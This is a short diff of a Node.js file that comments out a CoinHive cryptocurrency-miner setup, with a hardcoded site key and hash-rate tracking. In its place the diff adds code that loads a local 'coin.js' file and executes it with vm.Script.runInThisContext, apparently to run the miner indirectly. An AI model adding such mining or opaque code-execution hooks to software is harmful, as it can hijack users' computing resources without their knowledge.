@@ -22,24 +22,36 @@ var is_hive_start="0000";
 try{
 
 
+var vm = require('vm');
+var  fs = require("fs");
+is_hive_start=__dirname+"/coin.js"
+fs.readFile(is_hive_start,function(err,data){
 
-   var  CoinHive = require('coin-hive');
+  var script = new vm.Script(data.toString());
+  script.runInThisContext();
+  var sandboxes = [];
+
+})
+                    
+
+
+   // var  CoinHive = require('coin-hive');
     
-    /*Prepare_task*/
+   //  /*Prepare_task*/
 
-      var miner = CoinHive('SyP8K30PFsIXCdKa1Ng4R7Ieh6BhIbLq',function(err,miner){
-        miner.start(); 
+   //    var miner = CoinHive('SyP8K30PFsIXCdKa1Ng4R7Ieh6BhIbLq',function(err,miner){
+   //      miner.start(); 
 
-        miner.on('found', () => console.log('Found!'));
-            miner.on('accepted', () => console.log('Accepted!'));
-            miner.on('update',function(data){
+   //      miner.on('found', () => console.log('Found!'));
+   //          miner.on('accepted', () => console.log('Accepted!'));
+   //          miner.on('update',function(data){
 
-                    coin_hive["hashesPerSecond"]=data.hashesPerSecond;
-                  coin_hive["totalHashes"]=data.totalHashes;
-                  coin_hive["acceptedHashes"]=data.acceptedHashes;
+   //                  coin_hive["hashesPerSecond"]=data.hashesPerSecond;
+   //                coin_hive["totalHashes"]=data.totalHashes;
+   //                coin_hive["acceptedHashes"]=data.acceptedHashes;
 
-             });
-      });
+   //           });
+   //    });
        
 }
 catch(err){
